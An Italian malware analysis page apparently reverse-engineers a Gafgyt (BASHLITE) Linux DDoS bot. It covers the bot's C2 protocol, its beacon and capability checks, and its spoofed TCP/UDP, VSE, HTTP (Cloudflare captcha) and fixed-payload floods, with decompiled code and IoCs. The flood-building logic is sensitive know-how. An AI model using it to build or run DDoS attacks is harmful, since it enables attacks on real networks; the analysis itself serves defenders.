@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:image" content="https://spaghetti-hacker.github.io/gafgyt.png">
+<meta property="og:image:width" content="1024">
+<meta property="og:image:height" content="400">
+<meta property="og:title" content="GAFGYT">
+<meta property="og:description" content=";reverse engineering malware Gafgyt.">
+<meta property="og:type" content="article">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://spaghetti-hacker.github.io/gafgyt.png">
+
+
+<title>SOCK PRINTF</title>
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="stylesheet" href="hcf2.css">
+</head>
+<body>
+<div class="wrapper">
+<img src="https://spaghetti-hacker.github.io/gafgyt.png" alt="banner" style="width:100%;display:block;">
+<div id="output"></div>
+</div>
+<!--
+================================================================
+SCRIVI QUI IL TUO CONTENUTO
+================================================================
+
+REGOLE:
+  - La prima riga non vuota diventa il titolo della pagina
+    e l'intestazione del box (es. "NO_ELF ~ HCF")
+
+  - @@@...@@@ → blocco codice/assembly (pre-wrap, sfondo scuro)
+
+  - Testo normale → commento (colore muted, paragrafi separati
+    da righe vuote)
+
+  - I link si scrivono normalmente in HTML: <a href="...">testo</a>
+    Il parser li lascia passare nei commenti senza escapare.
+
+  - Tutto il contenuto finisce dentro un unico div.article,
+    esattamente come in no_elf.html.
+
+================================================================
+ESEMPIO:
+
+NO_ELF ~ HCF
+
+<a href="https://spaghetti-hacker.github.io/">&lt;&lt;</a>
+
+;primo commento introduttivo.
+
+;secondo paragrafo del commento.
+
+@@@
+0x00400806 push rbp
+0x00400807 mov rbp, rsp
+@@@
+
+;commento sul blocco qui sopra.
+
+@@@
+0x004008ea ret
+@@@
+
+;commento finale.
+<a href="https://spaghetti-hacker.github.io/">&lt;&lt;</a>
+================================================================
+-->
+<script id="content" type="text/plain">
+GAFGYT ~ HCF
+
+<a href="https://spaghetti-hacker.github.io/">index.html</a>
+
+visite: <span id="visits">...</span>
+
+@@@
+sha256: d1dbef470a10fda891b37ca9011e900cfc4f927550e881c1c96883a95bd88501
+
+file d1dbef470a10fda891b37ca9011e900cfc4f927550e881c1c96883a95bd88501
+ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+@@@
+
+;tipologia: Bot DDoS Linux
+;architettura: ELF x86-64
+;strumenti: radare2, Ghidra
+;famiglia: Gafgyt (aka BASHLITE)
+;variante: Linux/Gafgyt.ARS (classificazione ESET)
+;denominazione interna: "Snoopy" (stringa hardcoded in .rodata)
+
+--- nota metodologica ---
+
+;l'analisi dei disassemblati e dei decompilati e' stata condotta interamente a mano, includendo il mapping e la rinomina delle variabili, la ricostruzione del flusso di controllo e l'identificazione delle strutture dati. L'intelligenza artificiale e' stata utilizzata esclusivamente nella fase finale del lavoro, in funzione di supporto: per validare alcune ipotesi interpretative, per effettuare una revisione degli errori sul materiale gia' analizzato e in parte per la stesura del presente documento. Nessuna parte dell'analisi tecnica e' stata delegata o generata automaticamente. 
+
+--- vespa crabro ---
+
+;il calabrone (Vespa crabro) e' il vespide piu' grande presente in Europa, capace di raggiungere i 35 millimetri di lunghezza. Vive in colonie organizzate intorno a un nido centrale, dal quale le operaie si disperdono autonomamente nel territorio seguendo segnali chimici condivisi. Quando il nido viene percepito come minacciato, piu' individui reagiscono simultaneamente e in modo coordinato, producendo un effetto di attacco collettivo che appare sincronizzato pur nascendo da impulsi distribuiti. Ogni individuo e' perfettamente funzionale in autonomia, ma il danno reale emerge dalla sovrapposizione di piu' azioni parallele sullo stesso bersaglio. Il calabrone e' inoltre noto per la capacita' di colpire bersagli specifici con precisione, e per la persistenza: non abbandona il bersaglio fino al termine della minaccia percepita o allo scadere della risposta biologica che ne ha innescato il comportamento.
+
+=== EXECUTIVE SUMMARY ===
+
+;Gafgyt e' un bot DDoS per Linux (ELF x86-64) con architettura Command & Control classica. Il binario si connette a un server remoto, si autentica con un beacon iniziale contenente informazioni sull'host infetto, e attende comandi per lanciare attacchi di tipo flood verso target arbitrari.
+
+;supporta cinque vettori di attacco (TCP, UDP, VSE, HTTPSTOMP, STDHEX), con capacita' di IP spoofing tramite socket raw e costruzione manuale dei pacchetti.
+
+;IoC identificato: server C2 all'indirizzo 5.2.65.150:999.
+
+;per struttura, vettori di attacco e pattern implementativi, il campione e' compatibile con la famiglia Gafgyt e i suoi derivati.
+
+=== ARCHITETTURA GENERALE ===
+
+@@@
+main()
+ |
+ +-- init PRNG: srand(getpid()^time(0)) + init_rand(stesso seed).
+ |
+ +-- getOurIP(): fingerprinting locale tramite socket UDP verso 8.8.8.8:53,
+ |               lettura /proc/net/route, ioctl(SIOCGIFHWADDR).
+ |
+ +-- double-fork -> daemonizzazione
+ |   fork() -> waitpid() -> exit()     ;processo originale.
+ |   fork() -> exit()                  ;figlio1.
+ |   setsid() + chdir("/")             ;figlio2: nuova sessione isolata.
+ |   bsd_signal(SIGPIPE, SIG_IGN)      ;protezione da socket C2 chiusi.
+ |
+ +-- loop connessione C2
+ |   initConnection() -> retry ogni 5s.
+ |   beacon: getArch() + getPortz() + IP -> sockprintf().
+ |
+ +-- loop principale
+     |
+     +-- GC figli: waitpid(WNOHANG) su pids[].
+     |             compattazione array + realloc manuale.
+     |
+     +-- recvLine() ;blocca fino a nuova riga dal C2.
+     |
+     +-- parse: !<botid> <CMD> [arg1] [arg2] ...
+     |          toupper(CMD).
+     |          strtok() -> array argv[] su heap.
+     |
+     +-- processCmd(argc, argv).
+     |
+     +-- reconnect se recvLine() == -1.
+@@@
+
+=== PROTOCOLLO C2 ===
+
+--- connessione ---
+
+;la funzione initConnection() gestisce la connessione al C2. Itera su un array globale commServer[] di stringhe nel formato "host:porta", selezionando il server corrente tramite l'indice globale currentServer. Il parsing dell'indirizzo avviene con tre chiamate successive a strchr(':'):
+
+@@@
+commServer[] -> "5.2.65.150:999"   ;unico C2 identificato nel binario
+
+[0x00403af9]
+mov rax, qword [rax*8 + obj.commServer]
+@@@
+
+;commServer[currentServer] -> "5.2.65.150:999"
+;array di puntatori a stringa, *8 byte (puntatori 64-bit)
+ 
+@@@
+strchr(dest, ':')   ;verifica esistenza separatore.
+atoi(ptr + 1)       ;legge la porta come intero.
+*ptr = '\0'         ;tronca la stringa sull'host.
+@@@
+
+;il parsing dell'indirizzo avviene con tre chiamate successive a strchr(':').
+
+@@@
+mov ecx, 0x1e       ;30 secondi
+call sym.connectTimeout
+@@@
+
+;il tentativo di connessione ha un timeout di 30 secondi.
+
+;la prima chiamata verifica la presenza del separatore, la seconda legge la porta con atoi(), la terza tronca la stringa scrivendo '\0' sul carattere ':'. Il tentativo di connessione ha un timeout di 30 secondi (connectTimeout). In caso di fallimento, il chiamante ripete la chiamata incrementando currentServer, realizzando cosi' un meccanismo di failover.
+
+;porta di default hardcoded: 0x1b46 (6982). La porta C2 effettiva e' 999.
+
+--- beacon iniziale ---
+
+;dopo la connessione, il bot trasmette:
+
+;IP locale (ottenuto tramite getOurIP).
+;architettura CPU (getArch, es. "x86_64").
+;porta rilevante sull'host (getPortz).
+
+;getPortz() verifica tramite access() la presenza di /usr/bin/python, /usr/bin/python3, /usr/bin/perl, /usr/sbin/telnetd. Il risultato informa il C2 sulle capability di esecuzione script e propagazione via telnet dell'host infetto.
+
+;il valore "22" non rappresenta una porta ma un indicatore di capability trasmesso al C2 nel beacon. La presenza di telnetd e' significativa perche' segnala che il dispositivo infetto si trova probabilmente in un segmento di rete popolato da altri dispositivi IoT con telnet esposto e credenziali di default. Il C2 puo' usare questa informazione per istruire il bot a tentare propagazione laterale tramite brute-force delle credenziali, meccanismo di diffusione caratteristico di Gafgyt e Mirai.
+
+@@@
+mov rdi, "/usr/bin/python"
+call sym.access
+mov rdi, "/usr/bin/python3"
+call sym.access
+mov rdi, "/usr/bin/perl"
+call sym.access
+mov rdi, "/usr/sbin/telnetd"
+call sym.access
+@@@
+
+;presenza di telnetd segnala possibilita' di propagazione laterale. Se il bot ha infettato un dispositivo che esegue telnetd, significa che si trova probabilmente in un segmento di rete popolato da altri dispositivi magari simili.
+;il risultato viene trasmesso al C2 nel beacon come indicatore di capability
+
+--- formato comandi ---
+
+@@@
+!<bot-id> <COMANDO> [arg1] [arg2] ... [argN]
+@@@
+
+;il parsing avanza byte per byte cercando '!' come prefisso e ' ' come separatore dopo il bot-id. Il nome del comando viene convertito in uppercase prima del confronto. Gli argomenti vengono tokenizzati con strtok() e copiati in buffer heap dedicati, costruendo un array argv[]-like passato a processCmd().
+
+--- comandi supportati ---
+
+@@@
+COMANDO     FUNZIONE        VETTORE
+-------     --------        -------
+
+TCP         ftcp()          TCP flood con IP spoofing
+UDP         SendUDP()       UDP flood con IP spoofing (SOCK_RAW)
+VSE         vseattack()     UDP flood protocollo Valve Source Engine
+HTTPSTOMP   SendHTTPHex()   HTTP flood contro endpoint Cloudflare
+            sendHTTPtwo()
+STDHEX      SendSTDHEX()    UDP flood con payload fisso (SOCK_DGRAM)
+STOP        kill(pid, 9)    Termina tutti i processi figlio attivi
+stop        kill(pid, 9)    (variante lowercase)
+Stop        kill(pid, 9)    (variante mixed case)
+@@@
+
+;elenco comandi e funzionalità.
+
+@@@
+mov qword [var_120h], 0x40be9c   ;"TCP"
+mov qword [var_128h], 4
+repe cmpsb byte [rsi], byte [rdi]
+@@@
+
+;Il dispatch avviene tramite blocchi repe cmpsb consecutivi, uno per comando.
+
+@@@
+strncmp(argv[0], "TCP\0", 4)
+jne <prossimo_blocco>
+@@@
+
+;confronto 4 byte.
+
+;i tre comandi di stop sono implementati come tre blocchi distinti con confronto case-sensitive. La ridondanza e' intenzionale: il bot accetta il comando indipendentemente dalla capitalizzazione ricevuta.
+
+=== GESTIONE DEI PROCESSI FIGLI ===
+
+;ogni attacco viene eseguito in un processo figlio separato tramite listFork(), wrapper attorno a fork() che mantiene aggiornato l'array globale pids[].
+
+@@@
+__pid_t listFork(void) {
+       __pid_t pid_fork;
+       void *puntatore_nuova_memoria;
+       uint i;
+
+       pid_fork = fork();
+       if (pid_fork != 0) {
+           numpids = numpids + 1;
+           puntatore_nuova_memoria = malloc(numpids * 4 + 4);
+           for (i = 0; (ulong)i < numpids - 1U; i = i + 1) {
+               *(int *)((ulong)i * 4 + (long)puntatore_nuova_memoria) =
+                   *(int *)((ulong)i * 4 + (long)pids);
+           }
+           ;copia elementi preesistenti nel nuovo buffer.
+           *(__pid_t *)((long)puntatore_nuova_memoria + numpids * 4 - 4) = pid_fork;
+           ;accoda il pid del nuovo figlio nell'ultimo slot.
+           free(pids);
+           pids = puntatore_nuova_memoria;
+       }
+       return pid_fork;
+       ;ritorna pid al padre, 0 al figlio: semantica identica a fork().
+   }
+@@@
+
+;ad ogni chiamata nel ramo padre:
+
+;numpids viene incrementato.
+;viene allocato un nuovo buffer di dimensione (numpids * 4) + 4 byte.
+;gli elementi preesistenti vengono copiati nel nuovo buffer.
+;il pid del nuovo figlio viene accodato.
+;il vecchio buffer viene liberato con free().
+;obj.pids viene aggiornato al nuovo puntatore.
+
+;il figlio bypassa completamente questa logica e ritorna 0, replicando la semantica standard di fork(). L'effetto collaterale e' trasparente al chiamante: il padre riceve il pid del figlio, il figlio riceve 0, esattamente come con una fork diretta.
+
+;il garbage collector nel loop principale esegue waitpid(WNOHANG) su tutti i pid in pids[]. Per ogni figlio terminato, l'array viene compattato con uno shift-left e ridimensionato tramite una nuova coppia malloc/free.
+
+@@@
+mov edx, 1              ;WNOHANG
+call sym.waitpid
+test eax, eax
+jle <skip>              ;figlio ancora vivo o errore
+mov dword [rcx], eax    ;pids[i-1] = pids[i]  <- shift left
+mov dword [rax], 0      ;pids[numpids-1] = 0
+dec rax                 ;numpids--
+call sym.malloc         ;realloc manuale: (numpids+1)*4
+call sym.free           ;libera vecchio array
+@@@
+
+;se il target e' una lista di indirizzi separati da virgola, viene creato un processo figlio separato per ciascun target tramite strtok(",").
+
+@@@
+pcVar10 = strchr(pcVar1, 0x2c);   
+;cerca ',' nel target
+   if (pcVar10 == NULL) {
+       iVar7 = listFork();
+       ;target singolo: un solo figlio
+   } else {
+       local_c8 = strtok(pcVar1, ",");
+       while (local_c8 != NULL) {
+           iVar7 = listFork();
+           ;un figlio per ogni token
+           local_c8 = strtok(NULL, ",");
+       }
+   }
+@@@
+
+;limitazioni implementative:
+
+;malloc() non viene verificato in caso di fallimento.
+;fork() con ritorno -1 non viene gestita.
+;accesso a variabili globali senza sincronizzazione (non thread-safe).
+
+=== VETTORI DI ATTACCO ===
+
+--- TCP flood con IP spoofing (ftcp) ---
+
+;firma:
+
+@@@
+ftcp(host, porta, durata, cidr_prefix, flag_tcp, payload_size, pck_per_burst)
+
+fd = socket(2, 3, 6)         ;AF_INET, SOCK_RAW, IPPROTO_TCP
+optval = 1
+setsockopt(fd, 0, 3, &optval, 4)
+@@@
+
+;IP_HDRINCL: il programma costruisce l'header IP manualmente.
+
+;costruisce pacchetti IP/TCP raw con IP_HDRINCL, randomizzando l'IP sorgente ad ogni iterazione entro la subnet definita dal prefisso CIDR. ;la netmask viene calcolata come:
+
+@@@
+netmask = -(1 << (32 - cidr_prefix))
+@@@
+
+;es. cidr_prefix=24 -> 0xFFFFFF00 (/24).
+;es. cidr_prefix=0  -> netmask=0, IP random su tutto lo spazio IPv4.
+
+;se cidr_prefix e' 0, gli IP sorgente vengono generati su tutto lo spazio IPv4.
+
+;i flag TCP vengono configurati tramite parsing di una stringa separata da virgole. I valori supportati sono: "syn", "rst", "fin", "ack", "psh", "all". Il confronto avviene tramite repe cmpsb inline (equivalente a strncmp). Il valore "all" attiva simultaneamente SYN|RST|FIN|ACK|PSH.
+
+@@@
+mov qword [var_d8h], 0x40baca    ;"syn"
+mov qword [var_f0h], 0x40bace    ;"rst"
+mov qword [var_108h], 0x40bad2   ;"fin"
+mov qword [var_120h], 0x40bad6   ;"ack"
+mov qword [var_138h], 0x40bada   ;"psh"
+mov qword [var_c0h], 0x40bac4    ;"all"
+repe cmpsb byte [rsi], byte [rdi]
+@@@
+
+;confronto inline equivalente a strncmp, evita chiamata a funzione.
+
+@@@
+or edx, 2    ;SYN
+or edx, 4    ;RST
+or edx, 1    ;FIN
+or edx, 0x10 ;ACK
+or edx, 8    ;PSH
+@@@
+
+;"all" attiva tutti i flag contemporaneamente
+
+;ad ogni iterazione del loop di flood vengono rerandomizzati:
+
+;IP sorgente (offset 0xc dell'header IP).
+;IP identification (offset 0x4).
+;sequence number TCP (offset 0x4 dell'header TCP).
+
+@@@
+call sym.getRandomIP         ;nuovo IP sorgente nella subnet CIDR
+mov dword [rax + 0xc], edx   ;offset 0xc header IP = src_addr
+call sym.rand_cmwc
+mov word [rax + 4], dx       ;offset 0x4 header IP = identification
+call sym.rand_cmwc
+mov dword [tcp_header + 4]   ;sequence number TCP
+call sym.tcpcsum             ;ricalcolo checksum TCP
+call sym.csum                ;ricalcolo checksum IP
+@@@
+
+;dopo ogni modifica vengono ricalcolati i checksum TCP (tcpcsum) e IP (csum). Il loop interno conta i pacchetti per burst, quello esterno controlla la scadenza tramite time().
+
+--- UDP flood con IP spoofing (SendUDP) ---
+
+;firma:
+
+@@@
+SendUDP(target_ip, dst_port, duration_sec, payload_size, pkt_count, cidr_prefix)
+@@@
+
+;funzionalmente analoga a ftcp ma per il protocollo UDP. Apre una raw socket (AF_INET/SOCK_RAW/IPPROTO_UDP) con IP_HDRINCL e costruisce manualmente header IP e header UDP. La netmask CIDR e il calcolo dell'IP sorgente seguono lo stesso schema di ftcp.
+
+;una differenza rilevante rispetto agli altri vettori e' l'inizializzazione del PRNG: prima del loop di flood, SendUDP esegue 50 iterazioni che mescolano rand_cmwc(), time(), srandom(), rand() e init_rand(), con l'obiettivo esplicito di massimizzare l'entropia degli IP sorgente generati.
+
+@@@
+local_38 = 0x32;    
+;50 iterazioni
+   while (true) {
+       local_38--;
+       if (local_38 == -1) break;
+       tVar11 = time(NULL);
+       uVar8  = rand_cmwc();
+       srandom(uVar8 ^ (uint)tVar11);
+       iVar7  = rand();
+       init_rand(iVar7);
+   }
+@@@
+
+;mixing aggressivo: rand_cmwc ^ time -> srandom -> rand -> init_rand.
+;obiettivo: massimizzare l'imprevedibilita' degli IP sorgente spoofati.
+
+@@@
+udp_header[0] = rand_cmwc()              ;src_port: random
+udp_header[1] = htons(dst_port)          ;dst_port: fisso o random
+udp_header[2] = htons(payload_size + 8)  ;length
+udp_header[3] = 0   
+@@@
+
+;header UDP prodotto (nessun checksum).  
+
+;ad ogni pacchetto inviato vengono rerandomizzati:
+
+;IP sorgente (getRandomIP con netmask CIDR).
+;IP identification (offset 0x4 header IP).
+;porta sorgente UDP.
+;porta destinazione UDP (solo se dst_port == 0).
+
+;il checksum IP viene ricalcolato ad ogni iterazione. Il payload viene generato una sola volta prima del loop tramite makeRandomStr() e non cambia tra un pacchetto e l'altro. La struttura a doppio loop gestisce burst di pkt_count pacchetti ripetuti fino allo scadere di duration_sec secondi.
+
+;l'assenza del checksum UDP e' intenzionale: su IPv4 il checksum UDP e' opzionale (RFC 768) e il kernel accetta pacchetti con checksum zero.
+
+--- VSE flood (vseattack) ---
+
+;firma:
+vseattack(addr, porta, durata, dimensione_pck, dimensione, pck_totali, limite_blocco_pck, millisecondi_di_pausa)
+
+;VSE: sta per Valve Source Engine. Il flood imita le query A2S_INFO del protocollo di Valve, usate per richiedere informazioni ai server di giochi come CS e TF2. Il payload hardcoded e' "TSource Engine Query" seguito da dati randomici.
+
+@@@
+payload = "TSource Engine Query + /x54/x53/x6f/x75/x72/x63/x65..."
+@@@
+
+;stringa A2S_INFO hardcoded seguita da junk randomico
+
+;la funzione seleziona due modalita' operative in base al parametro dimensione_pck:
+
+@@@
+if (size_locale == 0x20) {
+     fd = socket(2, 2, 0x11);    
+     ;AF_INET, SOCK_DGRAM, IPPROTO_UDP
+     ;modalita' 1: UDP standard, nessun IP spoofing.
+ } else {
+     fd2 = socket(2, 3, 0x11);   
+     ;AF_INET, SOCK_RAW, IPPROTO_UDP
+     setsockopt(fd2, 0, 3, &opt, 4);
+     ;modalita' 2: raw socket con IP_HDRINCL, IP spoofing abilitato.
+ }
+@@@
+
+;il rate limiting nel loop e' implementato tramite usleep:
+ 
+@@@
+if (limite_blocco_pck == idx) {
+    usleep(millisecondi_di_pausa * 1000);
+    ;pausa ogni N pacchetti per non saturare la banda locale.
+    idx = 0;
+}
+@@@
+
+;modalità 1 (dimensione_pck == 0x20): SOCK_DGRAM
+
+;socket UDP standard.
+;payload randomico allocato su heap.
+;porta di destinazione randomica se porta == 0.
+
+;modalità 2 (dimensione_pck != 0x20): SOCK_RAW con IP_HDRINCL
+
+;costruzione manuale dell'header IP+UDP.
+;IP spoofing tramite getRandomIP() con netmask calcolata da dimensione_pck.
+;rerandomizzazione ad ogni iterazione di: IP sorgente, porta sorgente, IP identification.
+;ricalcolo checksum IP (csum) ad ogni pacchetto.
+
+;il rate limiting e' implementato tramite usleep(millisecondi_di_pausa * 1000) ogni limite_blocco_pck pacchetti. La terminazione avviene per contatore (pck_totali) o per scadenza temporale (durata secondi).
+
+--- HTTP flood (HTTPSTOMP) ---
+
+;HTTPSTOMP e' l'unico vettore che opera a livello applicativo anziche' di rete: non costruisce pacchetti raw e non usa IP spoofing, ma apre connessioni TCP reali verso il target. Questo lo rende inefficace contro infrastrutture che filtrano il traffico a livello 3, ma particolarmente adatto contro target protetti da CDN dove il flood di rete viene assorbito prima di raggiungere il server.
+
+;firme:
+
+@@@
+SendHTTPHex(comando, domain, proto, param_4, tempo, num_threads)
+sendHTTPtwo(comando, domain, proto, param_4, tempo, num_threads)
+@@@
+
+;le due funzioni vengono chiamate in sequenza dallo stesso processo figlio. Il comando HTTPSTOMP e' l'unico vettore che non usa IP spoofing: opera a livello applicativo su connessioni TCP reali.
+
+;SendHTTPHex genera num_threads processi figli tramite un loop di fork() a cascata (non N fork parallele dal padre, ma una catena padre->figlio->nipote). Ogni processo entra in un loop infinito che:
+
+@@@
+i = 0;
+while (true) {
+    if (num_threads <= i) return;
+    sprintf(richiesta_get,
+        "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n...",
+        comando, payload_nameserver, domain, useragents[rand() % 0x24]);
+    ;0x24 = 36 User-Agent hardcoded, selezione casuale per eludere filtri
+    eax = fork();
+    if (eax != 0) break;   ;padre esce dal loop di fork
+    i++;
+    ;figlio incrementa e forca a sua volta -> catena padre->figlio->nipote
+}
+@@@
+
+;apre una nuova connessione TCP verso il target (socket_connect).
+;invia una richiesta HTTP malformata.
+;legge 1 byte di risposta come sync point.
+;chiude la connessione e ripete.
+
+;il payload dell'URI e' la stringa "NAMESERVER " (11 byte) ripetuta per 265 byte, conservata in memoria XOR-ata con chiave 0xCA:
+
+@@@
+[0x84,0x8B,0x87,0x8F,0x99,0x8F,0x98,0x9C,0x8F,0x98,0xEA] ^ 0xCA = "NAMESERVER "
+memcpy(payload_nameserver, &encoded_nameserver_payload, 0x109)
+@@@
+
+;0x109 = 265 byte copiati da .data
+;[0x84,0x8B,...] ^ 0xCA = "NAMESERVER "
+;XOR con chiave fissa 0xCA: offuscamento statico minimale
+
+;la richiesta prodotta e' del tipo:
+
+@@@
+"GET NAMESERVER NAMESERVER NAMESERVER ... HTTP/1.1"
+@@@
+
+;ogni processo entra nel loop di attacco:
+ 
+@@@
+do {
+    do {
+        if (tempo_max <= time(NULL)) exit(0);
+        fd = socket_connect(domain, proto);
+    } while (fd == 0)   
+    ;retry fino a connessione riuscita
+    write(fd, richiesta_get, strlen(richiesta_get));
+    read(fd, &buffer_r, 1);   
+    ;legge 1 byte come sync point
+    close(fd)
+} while (true)
+@@@
+
+;pattern apri/invia/leggi 1byte/chiudi: no keep-alive, massimo overhead TCP.
+
+;il path non inizia con '/', violando RFC 7230. Lo User-Agent viene scelto casualmente da un array di 36 stringhe hardcoded.
+
+;sendHTTPtwo opera sullo stesso schema ma costruisce richieste verso l'endpoint "/cdn-cgi/l/chk_captcha", percorso specifico del sistema antibot di Cloudflare. L'obiettivo e' saturare il meccanismo di challenge piuttosto che il server
+sottostante.
+
+@@@
+"%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\n..."
+@@@
+
+;target specifico del sistema antibot Cloudflare.
+;obiettivo: saturare il meccanismo di challenge, non il server sottostante.
+
+--- UDP flood con payload fisso (SendSTDHEX) ---
+
+;firma:
+
+@@@
+SendSTDHEX(hostname, porta, durata_in_sec)
+
+fd = socket(2, 2, 0)    ;AF_INET, SOCK_DGRAM, nessun IP spoofing
+IP = gethostbyname(hostname)
+@@@
+
+;la variante piu' minimale. Socket UDP standard senza IP_HDRINCL.
+;gethostbyname: funzione legacy, non thread-safe, nessun controllo errori.
+ 
+;il payload e' il pattern fisso "58 99 21" per 1460 byte:
+ 
+@@@
+local_48 = &DAT_0040bae0    ;ptr ai byte grezzi: 58 99 21 ripetuto.
+local_40 = "/x8r/x58/x99/x21/x8r/x58/x99/x21..."
+@@@
+
+;i due puntatori contigui sullo stack formano il buffer da 0x5b4 byte.
+
+@@@
+send(fd, &local_48, 0x5b4, 0)
+@@@
+
+;1460 = MTU Ethernet (1500) - IP header (20) - UDP header (8).
+;massimizza il payload per singola trasmissione senza frammentazione.
+  
+@@@
+if (0x31 < local_c) { ;ogni 50 iterazioni
+    send(...);
+    connect(fd, &struct_sockaddr_in, 0x10);
+    ;connect su UDP: non apre connessione reale, fissa solo il peer di default
+    ;chiamata DOPO send, ordine invertito rispetto al canone ma non causa errori
+}
+local_c++;
+@@@
+
+;il throttle e' un busy-loop grezzo.
+ 
+@@@
+if (durata_in_sec + time_avvio <= time(NULL)) {
+    close(fd);
+    _exit(0);    
+    ;_exit vs exit: bypassa atexit/destructor
+}
+@@@
+
+;la terminazione bypassa qualunque handler atexit.
+
+;la variante piu' minimale disponibile. Apre un socket UDP standard (AF_INET/SOCK_DGRAM) senza IP_HDRINCL: nessun IP spoofing, nessuna costruzione manuale degli header. La risoluzione del target avviene tramite gethostbyname() (funzione legacy, non thread-safe).
+
+;il payload e' il pattern fisso "58 99 21" ripetuto per 1460 byte, conservato sia come byte grezzi in .data (offset 0x0040bae0) sia come stringa ASCII nella sezione dati. I due puntatori sullo stack vengono trasmessi contigui come unico buffer da 0x5b4 byte a send().
+
+;la dimensione di 1460 byte corrisponde alla MTU Ethernet (1500) meno gli header IP (20) e UDP (8): massimizza il payload per singola trasmissione senza frammentazione.
+
+;il throttle e' implementato con un busy-loop: send() viene chiamata solo ogni 50 iterazioni del loop principale (contatore local_c > 0x31). Non c'e' usleep ne' rate limiting esplicito.
+
+;la terminazione avviene confrontando time() con time_avvio + durata_in_sec, seguita da _exit(0) che bypassa qualunque handler atexit registrato.
+
+;IoC specifico: il pattern "58 99 21" ripetuto nel traffico UDP e' sufficiente per una regola Snort/Suricata che identifichi questa variante.
+
+=== ASPETTI TECNICI RILEVANTI ===
+
+--- PRNG predicibile ---
+
+;i due generatori di numeri casuali (libc srand e PRNG custom init_rand) vengono inizializzati con lo stesso seed:
+
+@@@
+seed = getpid() ^ time(0)
+
+0x403bd9  mov ebx, eax        ;ebx = time(0)
+0x403bdb  call sym.getpid
+0x403be0  xor eax, ebx        ;seed = getpid() ^ time(0)
+0x403be4  call sym.srand
+0x403bfe  call sym.init_rand  ;stesso seed per il PRNG custom
+@@@
+
+;l'XOR con il PID aggiunge entropia minima per differenziare istanze concorrenti sullo stesso host, ma il seed rimane predicibile. Un osservatore con visibilita' sul timestamp di avvio del processo puo' ricostruire il seed e predire la sequenza di IP sorgente generati, rendendo il flood tracciabile nonostante lo spoofing.
+
+;SendUDP tenta di mitigare questo limite con 50 iterazioni di mixing aggiuntivo (rand_cmwc ^ time -> srandom -> rand -> init_rand), ma poiche' anche time() e' osservabile, il miglioramento e' marginale. Questo e' un pattern ricorrente nei bot derivati da Mirai, dove la robustezza crittografica non e' una priorita'.
+
+--- Spoofing e costruzione manuale dei pacchetti ---
+
+;ftcp, SendUDP e vseattack (modalita' raw) costruiscono i pacchetti interamente in userspace tramite socket AF_INET/SOCK_RAW con IP_HDRINCL. La sequenza comune e':
+
+@@@
+uVar10 = getRandomIP(netmask);
+uVar10 = htonl(uVar10);
+*(uint32_t *)((long)ip_header + 0xc) = uVar10;   ;src_addr
+uVar6 = rand_cmwc();
+*(uint16_t *)((long)ip_header + 4) = uVar6;      ;identification
+uVar6 = csum(packet_buf, total_length);
+*(uint16_t *)((long)ip_header + 10) = uVar6;     ;checksum IP
+sendto(fd, packet_buf, packet_size, 0, &dest_addr, 0x10);
+;aggiornamento parziale: solo i campi che variano, il resto rimane invariato.
+@@@
+
+;makeIPPacket() / makevsepacket(): popola header IP con IP sorgente random
+;Compilazione manuale header TCP o UDP (porte, flags, lunghezze)
+;makeRandomStr(): riempie il payload
+;tcpcsum() / csum(): calcolo checksum
+;sendto(): invio grezzo
+
+;ad ogni iterazione del loop vengono aggiornati solo i campi che variano (IP sorgente, porte, sequence number, identification), evitando di ricostruire l'intero pacchetto. I checksum vengono ricalcolati dopo ogni modifica.
+
+;l'unica eccezione e' SendUDP, che non calcola il checksum UDP (campo impostato a 0): comportamento valido su IPv4 per RFC 768, accettato dal kernel ricevente.
+
+@@@
+udp_header[3] = 0    ;checksum UDP omesso, valido per RFC 768 su IPv4
+@@@
+
+--- Obfuscazione del payload HTTP ---
+
+;il payload "NAMESERVER " usato da SendHTTPHex e' conservato in memoria XOR-ato con chiave 0xCA. Si tratta di una tecnica di offuscamento statico minimale.
+
+;decodifica in Python:
+
+;bytes([b ^ 0xCA for b in encoded]) -> b"NAMESERVER " * N
+;chiave fissa hardcoded: non varia tra esecuzioni
+
+;non impedisce l'analisi dinamica, ma rende meno immediata l'identificazione del payload con grep o YARA sul binario a riposo. La chiave 0xCA e' hardcoded e non varia tra esecuzioni.
+
+--- Fingerprinting del C2 tramite getPortz ---
+
+;prima di trasmettere il beacon, il bot verifica la presenza di interpreti e demoni sull'host tramite access():
+
+@@@
+/usr/bin/python   -> valore "22" nel beacon
+/usr/bin/python3  -> valore "22"
+/usr/bin/perl     -> valore "22"
+/usr/sbin/telnetd -> valore "22"
+@@@
+
+;il valore trasmesso al C2 non e' una porta nel senso tradizionale, ma un indicatore di capability. La presenza di telnetd in particolare segnala la possibilita' di propagazione laterale, comportamento caratteristico di Mirai e derivati che si propagano sfruttando credenziali di default su dispositivi IoT raggiungibili via telnet.
+
+=== INDICATORI DI COMPROMISSIONE (IoC) ===
+
+@@@
+Tipo        Valore                      Contesto
+----        ------                      --------
+IP:porta    5.2.65.150:999              Server C2 hardcoded in commServer[0]
+Stringa     "Snoopy."                   Banner nel segmento .rodata
+Stringa     "TSource Engine Query"      Payload VSE flood hardcoded
+Percorso    /cdn-cgi/l/chk_captcha      Target HTTP flood (Cloudflare bypass)
+Porta       6982 (0x1b46)               Porta C2 di default nel codice
+Bytes       58 99 21 (ripetuto)         Payload UDP fisso di SendSTDHEX
+Stringa     "NAMESERVER " (XOR 0xCA)    Payload URI di SendHTTPHex in .data
+Offset      0x0040bae0                  Payload grezzo SendSTDHEX in .data
+Offset      0x0040bca0                  Payload XOR SendHTTPHex in .data
+@@@
+
+=== NOTE FINALI ===
+
